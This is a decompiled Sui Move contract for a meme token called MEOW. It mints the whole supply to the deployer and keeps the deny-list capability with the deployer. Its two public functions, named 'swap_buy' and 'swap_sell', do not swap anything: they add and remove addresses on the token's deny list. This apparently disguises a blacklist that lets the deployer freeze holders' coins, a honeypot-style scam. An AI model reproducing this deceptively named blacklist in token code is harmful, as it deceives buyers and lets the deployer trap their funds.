module 0xc85fccd1be8ae2c2f0e568283beac74bb2ce255101b43150eee9f38e4f87283b::meow {
    struct MEOW has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MEOW, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MEOW>(arg0, 9, b"MEOW", b"Meowing cat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQ21XSGs6FBUHXm6VLxEf1PukAeeARnNvXfWugPkeK2bx"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MEOW>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MEOW>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MEOW>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MEOW>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEOW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MEOW>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MEOW>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MEOW>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

